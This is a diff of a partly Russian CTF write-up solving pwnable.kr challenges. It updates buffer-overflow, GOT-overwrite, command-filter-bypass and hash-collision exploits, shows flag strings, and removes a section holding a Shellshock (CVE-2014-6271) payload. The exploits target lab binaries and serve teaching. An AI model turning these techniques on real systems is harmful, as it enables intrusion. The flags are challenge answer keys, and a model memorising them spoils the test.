@@ -52,8 +52,7 @@ int main(int argc, char* argv[], char* envp[]){
 ./fd 4660
 LETMEWIN
 
-> good job :)
-> mommy! I think I know what a file descriptor is!!
+> Mama! Now_I_understand_what_file_descriptors_are!
 ```
 
 ## [](#header-2)collision
@@ -111,9 +110,10 @@ int main(int argc, char* argv[]){
 `0x6c5cec8 + 0x6c5cec8 + 0x6c5cec8 + 0x6c5cec8 + 0x6c5cecc`
 
 ```bash
-./col $(python -c "print('\xc8\xce\xc5\x06' * 4 + '\xcc\xce\xc5\x06')")
+./col $(python3 -c 'import sys; sys.stdout.buffer.write(b"\xc8\xce\xc5\x06" * 4 + b"\xcc\xce\xc5\x06")')
+
+> Two_hash_collision_Nicely
 ```
-`daddy! I just managed to create a hash collision :)`
 
 ## [](#header-2)bof
 
@@ -123,6 +123,7 @@ int main(int argc, char* argv[]){
 > Download: http://pwnable.kr/bin/bof.c
 > 
 > Running at : nc pwnable.kr 9000
+> ssh bof@pwnable.kr -p2222 (pw:guest)
 
 **bof.c**
 
@@ -151,30 +152,10 @@ int main(int argc, char* argv[]){
 Нужно перезаписать переменную на 0xcafebabe, находим в дебаггере правильный офсет, засылаем байты, cat'ом не даём stdout закрыться
 
 ```bash
-(python -c “print('A'*52 + '\xbe\xba\xfe\xca')"; cat) | nc pwnable.kr 9000
+(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41" * 52 + b"\xbe\xba\xfe\xca")'; cat) | nc 0 9000
+
+> Daddy_I_just_pwned_a_buff3r!
 ```
-
-`daddy, I just pwned a buFFer :)`
-
-## [](#header-2)flag
-
-> Papa brought me a packed present! let's open it.
-> 
-> Download: http://pwnable.kr/bin/flag
-> 
-> This is reversing task. all you need is binary
-
-strings flag
-
-```
-PROT_EXEC|PROT_WRITE failed.
-$Info: This file is packed with the UPX executable packer http://upx.sf.net $
-$Id: UPX 3.08 Copyright © 1996-2011 the UPX Team. All Rights Reserved. $
-```
-
-`.\upx.exe -d .\flag`
-
-`UPX…? sounds like a delivery service :)`
 
 ## [](#header-2)passcode
 
@@ -250,7 +231,7 @@ passcode2: [ebp-0xc]
 passcode1 занимает последние 4 байта массива name
 
 * Заполняем массив до конца
-* В последних 4-ёх байтах передаём адрес функции fflush из GOT - 0x0804a004
+* В последних 4-х байтах передаём адрес функции fflush из GOT - 0x0804a004
 * scanf'ом в функции login перезаписываем адрес fflush в GOT на код, когда уже проверки прошли и функцией system вызывается cat - 0x080485e3 (передаём его в десятичной 134514147)
 * При вызове fflush исполнение перейдёт на нужную нам часть листинга
 
@@ -262,11 +243,24 @@ gdb-peda$ x/x 0x0804a004
 0x804a004 <fflush@got.plt>: 0x080485e3
 ```
 
-```bash
-python -c "print '\x01'*96 + '\x04\xa0\x04\x08' + '134514147'" | ./passcode
+```py
+from pwn import *
+
+context.log_level = "debug"
+
+payload = "A" * 96
+payload += "\x14\xc0\x04\x08" # address of fflush in GOT
+
+target = process("./passcode")
+target.recv()
+target.sendline(payload)
+target.recv()
+
+target.send(str(int(0x08049298))) # address after jbe flag checks
+target.interactive()
 ```
 
-`Sorry mom… I got confused about scanf usage :(`
+`> s0rry_mom_I_just_ign0red_c0mp1ler_w4rning`
 
 ## [](#header-2)random
 
@@ -286,7 +280,7 @@ int main(){
         unsigned int key=0;
         scanf("%d", &amp;key);
 
-        if( (key ^ random) == 0xdeadbeef ){
+        if( (key ^ random) == 0xcafebabe ){
                 printf("Good!\n");
                 system("/bin/cat flag");
                 return 0;
@@ -301,17 +295,18 @@ int main(){
 
 Первое значение рандома в си без инициализации - 0x6b8b4567
 
-key ^ 0x6b8b4567 == 0xdeadbeef --> 0x6b8b4567 ^ 0xdeadbeef == 0xb526fb88 == 3039230856
+key ^ 0x6b8b4567 == 0xcafebabe --> 0x6b8b4567 ^ 0xcafebabe == 0xa175ffd9 == 2708864985
 
-Передаём в прогу это число 3039230856
+Передаём в прогу это число 2708864985
 
-`random@pwnable:~$ echo -ne "3039230856" | ./random`
 
-> Good!
-> 
-> Mommy, I thought libc random is unpredictable…
+```bash
+random@pwnable:~$ echo -ne "2708864985" | ./random
 
-## [](#header-2)input
+> m0mmy_I_can_predict_rand0m_v4lue!
+```
+
+## [](#header-2)input2
 
 > Mom? how can I pass my input to a computer program?
 > 
@@ -397,6 +392,7 @@ import os
 import socket
 import time
 
+os.system("mkdir /tmp/tests4")
 os.system("ln -s /home/input2/flag /tmp/tests4/flag")
 
 with open("/tmp/tests4/\x0a", "w") as f:
@@ -410,7 +406,7 @@ args[64] = ''
 args[65] = "\x20\x0A\x0D"
 args[66] = "65005"
 
-process = subprocess.Popen(["/home/input2/input"] + args, stdin=stdin_r, stderr=stderr_r, env={"\xDE\xAD\xBE\xEF": "\xCA\xFE\xBA\xBE"}, cwd="/tmp/tests4/")
+process = subprocess.Popen(["/home/input2/input2"] + args, stdin=stdin_r, stderr=stderr_r, env={"\xDE\xAD\xBE\xEF": "\xCA\xFE\xBA\xBE"}, cwd="/tmp/tests4/")
 
 os.write(stdin_w, "\x00\x0A\x00\xFF")
 os.write(stderr_w, "\x00\x0A\x02\xFF")
@@ -423,7 +419,7 @@ s.sendall('\xDE\xAD\xBE\xEF')
 s.close()
 ```
 
-`Mommy! I learned how to pass various input in Linux :)`
+`> Mommy_now_I_know_how_to_pa5s_inputs_in_Linux`
 
 [stroobants.dev/pwnablekr-series-input.html](https://stroobants.dev/pwnablekr-series-input.htmlhttps://stroobants.dev/pwnablekr-series-input.html)
 
@@ -570,14 +566,13 @@ End of assembler dump.
 `hex(0x8ce4 + 0x8d0c + 0x8d80)`
 `> Out[33]: '0x1a770'`
 
+```bash
 > / $ ./leg
 > 
 > Daddy has very strong arm! : 108400
-> 
-> Congratz!
-> 
-> My daddy has a lot of ARMv5te muscle!
 
+> daddy_has_lot_of_ARM_muscl3
+```
 
 ## [](#header-2)mistake
 
@@ -662,32 +657,7 @@ input password : AAAAABBBBB
 
 Password OK
 
-Mommy, the operator priority always confuses me :(
-```
-
-## [](#header-2)shellshock
-
-> Mommy, there was a shocking news about bash.
-> 
-> I bet you already know, but lets just make it sure :)
-> 
-> ssh shellshock@pwnable.kr -p2222 (pw:guest)
-
-**shellshock.c**
-
-```c
-#include <stdio.h>
-int main(){
-        setresuid(getegid(), getegid(), getegid());
-        setresgid(getegid(), getegid(), getegid());
-        system("/home/shellshock/bash -c 'echo shock_me'");
-        return 0;
-}
-```
-
-```
-env x='() { :;}; /bin/cat flag' ./shellshock
-only if I knew CVE-2014-6271 ten years ago…!!
+Mommy_the_0perator_priority_confuses_me
 ```
 
 ## [](#header-2)coin1
@@ -697,6 +667,10 @@ only if I knew CVE-2014-6271 ten years ago…!!
 > (if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)
 > 
 > Running at : nc pwnable.kr 9007
+>
+> ssh coin1@pwnable.kr -p2222
+>
+> nc 0 9007 to get flag!
 
 ```
         ---------------------------------------------------
@@ -730,7 +704,7 @@ only if I knew CVE-2014-6271 ten years ago…!!
         - Ready? starting in 3 sec... -
 ```
 
-Бинарная сиртировка тупа
+Бинарная сортировка тупа
 
 Ну чё, посортируем
 
@@ -791,7 +765,7 @@ print(conn.recvline()) # {actual flag}
 conn.close()
 ```
 
-`b1NaRy_S34rch1nG_1s_3asy_p3asy`
+`b1naRy_S34rch1Ng_1s_3asy_p3asy`
 
 [код отсюда](https://zacheller.dev/pwnable-coin1)
 
@@ -831,9 +805,9 @@ int betting() //Asks user amount to bet
 
 2 варианта:
 
-1) Ввести сначала чисто больше 500 --> попадаем в if
+1) Ввести сначала число больше 500 --> попадаем в if
 
-2) Вводим число очень большое 2147483047
+2) Вводим еще раз число больше 2147483047
 
 3) Выигрываем в партии --> профит
 
@@ -843,7 +817,7 @@ int betting() //Asks user amount to bet
 
 2) Проигрываем
 
-`YaY_I_AM_A_MILLIONARE_LOL`
+`> Woohoo_I_am_now_a_MILL10NAIRE!`
 
 ## [](#header-2)lotto
 
@@ -957,8 +931,8 @@ int main(int argc, char* argv[]){
 ```python
 from pwn import *
 
-sh = ssh('lotto', 'pwnable.kr', password='guest', port=2222)
-p = sh.process('./lotto')
+#sh = ssh('lotto', 'pwnable.kr', password='guest', port=2222)
+p = process('./lotto')
 
 for i in range(1000):
   p.recv()
@@ -971,7 +945,7 @@ for i in range(1000):
     break
 ```
 
-`sorry mom… I FORGOT to check duplicate numbers… :(`
+`> Sorry_mom_1_Forgot_to_check_duplicates`
 
 ## [](#header-2)cmd1
 
@@ -1014,11 +988,12 @@ Single quotes pass the command without executing it.
 
 Double quotes executes the command then passes its output (cannot pass the filter).
 
-`./cmd1 '$(printf "/bin/%s%s" "s" "h")'`
-
-`/bin/cat /home/cmd1/flag`
-
-`mommy now I get what PATH environment is for :)`
+```bash
+> ./cmd1 '$(printf "/bin/%s%s" "s" "h")'
+> /bin/cat /home/cmd1/flag
+>
+> PATH_environment?_Now_I_really_g3t_it,_mommy!
+```
 
 ## [](#header-2)cmd2
 
